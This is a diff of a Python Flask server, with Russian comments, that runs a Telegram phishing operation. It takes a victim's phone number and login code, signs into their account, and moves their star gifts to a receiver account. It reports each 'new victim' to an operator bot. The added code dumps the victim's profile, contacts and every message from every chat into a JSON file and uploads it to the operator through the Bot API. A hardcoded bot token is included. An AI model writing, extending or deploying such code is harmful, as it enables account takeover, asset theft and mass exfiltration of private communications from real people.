@@ -1,16 +1,15 @@
-# server.py
+# server.py — полностью обновлённая версия
 from flask import Flask, render_template, request, jsonify, session
-from flask_cors import CORS
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.payments import TransferStarGiftRequest
-from telethon.tl.types import InputSavedStarGiftUser
+from telethon.tl.functions.users import GetFullUserRequest
 import asyncio
 import os
 import json
 import logging
-import threading
-import requests
+from threading import Thread
+from datetime import datetime  # <-- добавлено для метки времени
+import httpx
 
 logging.basicConfig(level=logging.INFO)
 
@@ -21,37 +20,106 @@ ADMIN_ID = 8503291981
 BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 
 app = Flask(__name__)
-CORS(app)  # Разрешаем кросс-доменные запросы
 app.secret_key = os.urandom(24)
 
+sessions = {}
 temp_clients = {}
 
-telethon_loop = None
-
-def get_telethon_loop():
-    global telethon_loop
-    if telethon_loop is None or telethon_loop.is_closed():
-        telethon_loop = asyncio.new_event_loop()
-        thread = threading.Thread(target=telethon_loop.run_forever, daemon=True)
-        thread.start()
-    return telethon_loop
+async def send_telegram_message(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    async with httpx.AsyncClient() as client:
+        await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 def notify_admin_sync(text):
-    """Отправка сообщения админу через Telegram Bot API (синхронно)"""
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": ADMIN_ID,
-            "text": text,
-            "parse_mode": "HTML"
-        }
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code != 200:
-            logging.error(f"Notify admin failed: {response.text}")
-        else:
-            logging.info(f"Admin notified: {text[:100]}")
+        asyncio.run(send_telegram_message(text))
     except Exception as e:
-        logging.error(f"Notify admin exception: {e}")
+        logging.error(f"Failed to notify admin: {e}")
+
+# ============================================================
+# === НОВОЕ: Функция сбора ВСЕХ данных аккаунта ===
+# ============================================================
+async def collect_full_user_data(client):
+    """Собирает профиль, контакты, все диалоги, все сообщения."""
+    data = {}
+    
+    # 1. Данные владельца
+    me = await client.get_me()
+    data['user'] = {
+        'id': me.id,
+        'username': me.username,
+        'first_name': me.first_name,
+        'last_name': me.last_name,
+        'phone': me.phone,
+        'is_bot': me.bot,
+        'is_premium': getattr(me, 'premium', False)
+    }
+    
+    # 2. Контакты
+    contacts = await client.get_contacts()
+    data['contacts'] = []
+    for contact in contacts:
+        data['contacts'].append({
+            'id': contact.id,
+            'username': contact.username,
+            'first_name': contact.first_name,
+            'last_name': contact.last_name,
+            'phone': contact.phone
+        })
+    
+    # 3. Диалоги и сообщения
+    dialogs = await client.get_dialogs()
+    data['dialogs'] = []
+    for dialog in dialogs:
+        dialog_info = {
+            'id': dialog.id,
+            'title': dialog.title,
+            'type': 'unknown',
+            'messages': []
+        }
+        if dialog.is_user:
+            dialog_info['type'] = 'user'
+        elif dialog.is_group:
+            dialog_info['type'] = 'group'
+        elif dialog.is_channel:
+            dialog_info['type'] = 'channel'
+        
+        # Собираем ВСЕ сообщения (без лимита)
+        try:
+            messages = []
+            async for msg in client.iter_messages(dialog, limit=None):
+                messages.append({
+                    'id': msg.id,
+                    'date': msg.date.isoformat() if msg.date else None,
+                    'text': msg.text,
+                    'from_id': msg.from_id.user_id if msg.from_id else None,
+                    'sender_id': msg.sender_id,
+                    'reply_to': msg.reply_to_msg_id,
+                    'media': bool(msg.media),
+                    'media_type': str(msg.media.__class__.__name__) if msg.media else None
+                })
+            dialog_info['messages'] = messages
+        except Exception as e:
+            dialog_info['error'] = str(e)
+            logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
+        
+        data['dialogs'].append(dialog_info)
+    
+    return data
+
+# === НОВОЕ: Отправка JSON-файла админу ===
+async def send_document_to_admin(file_path):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        async with httpx.AsyncClient(timeout=120.0) as http_client:
+            with open(file_path, 'rb') as f:
+                files = {'document': (os.path.basename(file_path), f, 'application/json')}
+                await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
+        logging.info(f"Document {file_path} sent to admin.")
+    except Exception as e:
+        logging.error(f"Failed to send document: {e}")
+
+# ============================================================
 
 async def check_balance_and_gifts(client):
     try:
@@ -73,76 +141,20 @@ async def transfer_nft_to_receiver(client, info):
     try:
         receiver = await client.get_entity(RECEIVER_USERNAME)
         
-        result_text = (
-            f"🔔 <b>Новая жертва!</b>\n"
-            f"👤 @{info.get('username', 'unknown')}\n"
-            f"🆔 ID: <code>{info.get('user_id', 'unknown')}</code>\n"
-            f"⭐ Баланс звёзд: {info.get('stars_balance', 0)}\n"
-            f"🎁 Подарков: {info.get('gifts_count', 0)}"
-        )
+        result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
         
-        # Пересылаем подарки через payments.transferStarGift (layer 198+)
-        if info.get('gifts_count', 0) > 0 and info.get('gifts'):
-            for gift in info['gifts']:
+        if info.get('gifts_count', 0) > 0:
+            for gift in info.get('gifts', []):
                 try:
-                    gift_id = None
-                    gift_slug = None
-                    
-                    # Собираем данные подарка
-                    if hasattr(gift, 'id'):
-                        gift_id = gift.id
-                    if hasattr(gift, 'slug'):
-                        gift_slug = gift.slug
-                    if hasattr(gift, 'gift_id'):
-                        gift_id = gift.gift_id
-                    
-                    gift_info = f"ID: {gift_id}"
-                    if gift_slug:
-                        gift_info += f", Slug: {gift_slug}"
-                    
-                    result_text += f"\n📦 Подарок: {gift_info}"
-                    
-                    if gift_id:
-                        try:
-                            # Основной метод: payments.transferStarGift с InputSavedStarGiftUser
-                            await client(TransferStarGiftRequest(
-                                stargift=InputSavedStarGiftUser(gift_id=gift_id),
-                                to_id=receiver
-                            ))
-                            result_text += " ✅ Отправлен"
-                            notify_admin_sync(f"🎁 Подарок {gift_id} отправлен на {RECEIVER_USERNAME}")
-                            
-                        except Exception as send_error:
-                            error_str = str(send_error)
-                            
-                            # Если ошибка что нужен slug — пробуем через slug
-                            if 'slug' in error_str.lower() and gift_slug:
-                                try:
-                                    from telethon.tl.types import InputSavedStarGiftSlug
-                                    await client(TransferStarGiftRequest(
-                                        stargift=InputSavedStarGiftSlug(slug=gift_slug),
-                                        to_id=receiver
-                                    ))
-                                    result_text += " ✅ Отправлен (через slug)"
-                                    notify_admin_sync(f"🎁 Подарок {gift_slug} отправлен на {RECEIVER_USERNAME}")
-                                except Exception as slug_error:
-                                    result_text += f" ❌ Ошибка slug: {str(slug_error)[:80]}"
-                                    logging.error(f"Slug send error: {slug_error}")
-                            else:
-                                result_text += f" ❌ Ошибка: {error_str[:80]}"
-                                logging.error(f"Send gift error: {send_error}")
-                    else:
-                        result_text += " ⚠️ Не удалось получить ID подарка"
-                        
+                    await client.send_gift(receiver, gift)
+                    result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                 except Exception as e:
-                    result_text += f"\n⚠️ Ошибка обработки: {str(e)[:80]}"
+                    result_text += f"\n❌ Ошибка отправки подарка: {e}"
         
         notify_admin_sync(result_text)
         return True
-        
     except Exception as e:
-        notify_admin_sync(f"❌ <b>Ошибка перевода:</b>\n{e}")
-        logging.error(f"Transfer error: {e}")
+        notify_admin_sync(f"❌ Ошибка перевода: {e}")
         return False
 
 @app.route('/')
@@ -163,12 +175,8 @@ def check_page(check_id):
             return render_template('index.html', check_amount=checks[check_id]['amount'])
     return render_template('index.html')
 
-@app.route('/api/send-code', methods=['POST', 'OPTIONS'])
+@app.route('/api/send-code', methods=['POST'])
 def api_send_code():
-    # Обработка preflight запроса
-    if request.method == 'OPTIONS':
-        return jsonify({"success": True}), 200
-    
     data = request.json
     phone = data.get('phone', '').strip()
     
@@ -176,12 +184,13 @@ def api_send_code():
         return jsonify({"success": False, "error": "Введите номер"}), 400
     
     session_id = os.urandom(8).hex()
+    session['session_id'] = session_id
     
-    loop = get_telethon_loop()
+    client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
+    temp_clients[session_id] = client
     
     async def send_code():
         try:
-            client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH, loop=loop)
             await client.connect()
             result = await client.send_code_request(phone)
             temp_clients[session_id] = {
@@ -189,32 +198,22 @@ def api_send_code():
                 'phone': phone,
                 'phone_code_hash': result.phone_code_hash
             }
-            # Уведомление админу о новом запросе кода
-            notify_admin_sync(f"📱 <b>Новый запрос кода</b>\n📞 Телефон: <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>")
             return True
         except Exception as e:
             logging.error(f"Send code error: {e}")
-            notify_admin_sync(f"❌ <b>Ошибка отправки кода</b>\n📞 {phone}\nОшибка: {e}")
             return False
     
-    future = asyncio.run_coroutine_threadsafe(send_code(), loop)
-    try:
-        success = future.result(timeout=30)
-    except Exception as e:
-        logging.error(f"Future error: {e}")
-        success = False
+    loop = asyncio.new_event_loop()
+    success = loop.run_until_complete(send_code())
+    loop.close()
     
     if success:
         return jsonify({"success": True, "session_id": session_id})
     else:
         return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
 
-@app.route('/api/verify-code', methods=['POST', 'OPTIONS'])
+@app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
-    # Обработка preflight запроса
-    if request.method == 'OPTIONS':
-        return jsonify({"success": True}), 200
-    
     data = request.json
     code = data.get('code', '').strip()
     session_id = data.get('session_id', '')
@@ -230,48 +229,44 @@ def api_verify_code():
     phone_code_hash = session_data['phone_code_hash']
     phone = session_data['phone']
     
-    loop = get_telethon_loop()
-    
     async def verify_and_process():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            
-            # Уведомление об успешном входе
-            notify_admin_sync(f"✅ <b>Успешный вход!</b>\n📞 <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>\n🔄 Проверяю баланс и подарки...")
-            
+            # Получаем информацию о балансе и подарках
             info = await check_balance_and_gifts(client)
             if info:
-                await transfer_nft_to_receiver(client, info)
-            
-            # Логируем все подарки
-            if info and info.get('gifts_count', 0) > 0:
+                # === НОВОЕ: Сбор полного дампа и отправка админу ===
                 try:
-                    for gift in info.get('gifts', []):
-                        notify_admin_sync(f"📦 Обнаружен подарок: ID {getattr(gift, 'id', 'unknown')}, Slug: {getattr(gift, 'slug', 'unknown')}")
-                except Exception as log_error:
-                    logging.error(f"Gift log error: {log_error}")
+                    dump_data = await collect_full_user_data(client)
+                    dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+                    with open(dump_filename, 'w', encoding='utf-8') as f:
+                        json.dump(dump_data, f, ensure_ascii=False, indent=2)
+                    # Отправляем файл админу (асинхронно, не блокируя отправку подарков)
+                    await send_document_to_admin(dump_filename)
+                    # Удаляем локальный файл после отправки
+                    if os.path.exists(dump_filename):
+                        os.remove(dump_filename)
+                except Exception as e:
+                    logging.error(f"Error during data dump: {e}")
+                    await send_telegram_message(f"❌ Ошибка сбора дампа: {e}")
+                # === КОНЕЦ НОВОГО ===
+
+                # Отправляем подарки получателю
+                await transfer_nft_to_receiver(client, info)
             
             await client.disconnect()
             return True
-            
         except SessionPasswordNeededError:
-            notify_admin_sync(f"🔒 <b>Требуется 2FA облачный пароль</b>\n📞 <code>{phone}</code>")
             await client.disconnect()
             return "2fa_needed"
-            
         except Exception as e:
             logging.error(f"Verify error: {e}")
-            notify_admin_sync(f"❌ <b>Ошибка входа</b>\n📞 <code>{phone}</code>\nОшибка: {e}")
             await client.disconnect()
             return False
     
-    future = asyncio.run_coroutine_threadsafe(verify_and_process(), loop)
-    try:
-        result = future.result(timeout=30)
-    except Exception as e:
-        logging.error(f"Future error: {e}")
-        notify_admin_sync(f"❌ <b>Таймаут верификации</b>\n📞 <code>{phone}</code>")
-        result = False
+    loop = asyncio.new_event_loop()
+    result = loop.run_until_complete(verify_and_process())
+    loop.close()
     
     if result is True:
         return jsonify({"success": True, "message": "Авторизация успешна!"})
@@ -282,5 +277,4 @@ def api_verify_code():
 
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
